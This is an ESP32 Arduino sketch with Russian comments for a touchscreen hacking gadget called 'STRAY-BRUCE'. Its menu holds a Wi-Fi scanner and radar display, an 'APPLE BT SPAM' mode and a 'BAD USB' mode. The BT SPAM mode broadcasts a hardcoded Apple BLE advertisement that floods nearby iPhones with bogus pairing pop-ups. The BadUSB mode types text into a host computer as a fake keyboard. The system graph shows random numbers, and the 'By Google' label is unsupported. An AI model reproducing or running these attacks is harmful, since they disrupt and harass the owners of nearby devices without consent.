#include "Adafruit_GFX.h"
#include "Adafruit_ILI9341.h"
#include <Wire.h>
#include <Adafruit_FT6206.h>
#include <WiFi.h>
#include <NimBLEDevice.h> 
#include "USB.h"
#include "USBHIDKeyboard.h"

// --- КОНФИГУРАЦИЯ ПИНОВ ---
#define TFT_CS 42
#define TFT_DC 40
#define TFT_RST 41
#define STRAY_YELLOW 0xFFE0 
#define STRAY_ORANGE 0xFD20

Adafruit_ILI9341 tft = Adafruit_ILI9341(TFT_CS, TFT_DC, 39, 38, TFT_RST);
Adafruit_FT6206 ts = Adafruit_FT6206();
USBHIDKeyboard Keyboard;

// Глобальные переменные
int current = 0;
int state = 0; // 0-Main, 1-App
const char* menu[] = {"WIFI SCAN", "RADAR", "BT SPAM", "BAD USB", "SYSTEM"};

// Переменные для Радара
float radarAngle = 0;

// Переменные для BT Spam
bool isSpamming = false;
NimBLEAdvertising *pAdvertising;
uint8_t apple_packet[] = { 0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12 };

// Переменные для Системного графика
int graphX = 11;
int lastY = 180;
unsigned long lastGraphUpdate = 0;

void setup() {
  tft.begin();
  tft.setRotation(1); 
  Wire.begin(2, 1); 
  ts.begin(40);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  USB.begin();
  drawMain();
}

// --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
float getDist(int rssi) {
  return pow(10.0, ((-30.0 - rssi) / 25.0));
}

void drawExitButton() {
  tft.fillRect(280, 0, 40, 35, ILI9341_RED); 
  tft.setTextColor(ILI9341_WHITE); tft.setTextSize(2);
  tft.setCursor(292, 10); tft.print("X");
}

// --- ПРИЛОЖЕНИЯ ---

void runScanner() {
  state = 1; tft.fillScreen(ILI9341_BLACK);
  drawExitButton();
  tft.setCursor(10, 50); tft.setTextColor(STRAY_YELLOW); tft.setTextSize(1);
  tft.println("SCANNING WIFI...");
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n && i < 8; i++) {
    tft.setTextColor(STRAY_YELLOW); tft.print(i+1); tft.print(": ");
    tft.setTextColor(ILI9341_WHITE); tft.println(WiFi.SSID(i));
  }
}

void runRadar() {
  state = 1; tft.fillScreen(ILI9341_BLACK);
  tft.drawCircle(160, 120, 100, STRAY_YELLOW);
  tft.drawCircle(160, 120, 60, STRAY_YELLOW);
  tft.drawCircle(160, 120, 20, STRAY_YELLOW);
  tft.drawLine(60, 120, 260, 120, STRAY_YELLOW);
  tft.drawLine(160, 20, 160, 220, STRAY_YELLOW);
  drawExitButton();

  while(true) {
    int n = WiFi.scanNetworks();
    for(int a=0; a<10; a++) {
      float oldAngle = radarAngle - 0.2;
      tft.drawLine(160, 120, 160+cos(oldAngle)*100, 120+sin(oldAngle)*100, ILI9341_BLACK);
      tft.drawLine(160, 120, 160+cos(radarAngle)*100, 120+sin(radarAngle)*100, STRAY_YELLOW);
      radarAngle += 0.2;

      for (int i = 0; i < n && i < 10; i++) {
        int d = map(WiFi.RSSI(i), -100, -30, 100, 10);
        float pAng = i * (6.28 / n);
        int px = 160 + cos(pAng) * d;
        int py = 120 + sin(pAng) * d;
        uint16_t dotColor = (WiFi.SSID(i).indexOf("Wokwi") >= 0) ? ILI9341_RED : STRAY_YELLOW;
        tft.fillCircle(px, py, 4, dotColor);
      }

      if (ts.touched()) {
        TS_Point p = ts.getPoint();
        int tx = map(p.y, 0, 320, 0, 320);
        int ty = map(p.x, 0, 240, 0, 240);
        if (tx > 270 && ty < 45) { drawMain(); return; }
      }
      delay(30);
    }
  }
}

void startSpam() {
  NimBLEDevice::init("Stray-Bruce");
  pAdvertising = NimBLEDevice::getAdvertising();
  NimBLEAdvertisementData advertData;
  advertData.addData(apple_packet, sizeof(apple_packet));
  pAdvertising->setAdvertisementData(advertData);
  pAdvertising->start();
  isSpamming = true;
}

void stopSpam() {
  if (pAdvertising) pAdvertising->stop();
  NimBLEDevice::deinit(true);
  isSpamming = false;
}

void runBTSpam() {
  state = 1; tft.fillScreen(ILI9341_BLACK);
  drawExitButton();
  tft.setTextColor(STRAY_ORANGE); tft.setTextSize(2);
  tft.setCursor(10, 10); tft.println("APPLE BT SPAM");
  tft.drawFastHLine(0, 35, 320, STRAY_ORANGE);
  tft.setTextSize(1); tft.setCursor(10, 50); tft.print("STATUS: ");
  if (isSpamming) { tft.setTextColor(0x07E0); tft.println("ATTACKING..."); }
  else { tft.setTextColor(ILI9341_RED); tft.println("READY"); }
  tft.drawRect(80, 100, 160, 80, STRAY_ORANGE);
  tft.setCursor(120, 135); tft.setTextSize(2);
  tft.print(isSpamming ? "STOP" : "START");
}

void runBadUSB() {
  state = 1; tft.fillScreen(ILI9341_BLACK);
  drawExitButton();
  tft.setTextColor(STRAY_ORANGE); tft.setTextSize(2);
  tft.setCursor(10, 10); tft.println("BAD USB MODE");
  tft.drawRect(60, 100, 200, 60, STRAY_YELLOW);
  tft.setCursor(95, 125); tft.print("RUN PAYLOAD");
}

void runSystemInfo() {
  state = 1; tft.fillScreen(ILI9341_BLACK);
  drawExitButton();
  tft.setTextColor(STRAY_YELLOW); tft.setTextSize(2);
  tft.setCursor(10, 10); tft.println("SYSTEM STATUS:");
  tft.drawFastHLine(0, 35, 320, STRAY_YELLOW);
  tft.setTextSize(1);
  tft.setCursor(10, 45); tft.print("USER: STRAY_2025");
  tft.setCursor(10, 65); tft.print("CHIP: S3 N16R8 | NORILSK");
  tft.drawRect(10, 130, 300, 80, STRAY_YELLOW);
  graphX = 11;
  tft.setTextColor(0x07E0);
  tft.setCursor(10, 220); tft.println("STRAY-BRUCE OS v10.5 ONLINE (By Google)");
}

void updateGraph() {
  if (millis() - lastGraphUpdate > 50) {
    if (graphX > 305) { tft.fillRect(11, 131, 298, 78, ILI9341_BLACK); graphX = 11; }
    int val = random(140, 205);
    tft.drawLine(graphX, lastY, graphX + 2, val, 0x07E0);
    lastY = val; graphX += 2; lastGraphUpdate = millis();
  }
}

// --- ГЛАВНОЕ МЕНЮ ---

void drawMain() {
  state = 0; if (isSpamming) stopSpam();
  tft.fillScreen(ILI9341_BLACK);
  tft.fillRect(0, 0, 320, 35, STRAY_YELLOW);
  tft.setTextColor(ILI9341_BLACK); tft.setTextSize(2);
  tft.setCursor(65, 10); tft.print("STRAY-BRUCE v10.5");
  tft.drawRect(60, 80, 200, 80, STRAY_YELLOW); 
  drawMainText();
  tft.fillTriangle(15, 120, 45, 90, 45, 150, STRAY_YELLOW);   
  tft.fillTriangle(305, 120, 275, 90, 275, 150, STRAY_YELLOW); 
}

void drawMainText() {
  tft.fillRect(62, 82, 196, 76, ILI9341_BLACK);
  tft.setTextColor(STRAY_YELLOW); tft.setTextSize(2);
  int textLen = strlen(menu[current]);
  tft.setCursor(160 - (textLen * 6), 110); tft.print(menu[current]);
}

void loop() {
  if (ts.touched()) {
    TS_Point p = ts.getPoint();
    int y = map(p.x, 0, 240, 0, 240);
    int x = map(p.y, 0, 320, 0, 320);

    if (state == 0) { // Навигация
      if (x < 60) { current = (current > 0) ? current - 1 : 4; drawMainText(); delay(250); }
      else if (x > 260) { current = (current + 1) % 5; drawMainText(); delay(250); }
      else if (x > 60 && x < 260 && y > 80 && y < 160) { 
        if (current == 0) runScanner(); 
        else if (current == 1) runRadar();
        else if (current == 2) runBTSpam();
        else if (current == 3) runBadUSB();
        else if (current == 4) runSystemInfo();
        delay(300); 
      }
    } 
    else if (state == 1) { // Внутри приложений
      if (x > 270 && y < 45) { drawMain(); delay(300); }
      if (current == 2 && x > 80 && x < 240 && y > 100 && y < 180) { // BT Start/Stop
        if (!isSpamming) startSpam(); else stopSpam(); runBTSpam(); delay(400);
      }
      if (current == 3 && x > 60 && x < 260 && y > 100 && y < 160) { 
        Keyboard.begin(); Keyboard.println("HACKED BY STRAY-BRUCE"); delay(400); 
      }
    }
  }
  if (state == 1 && current == 4) updateGraph();
}
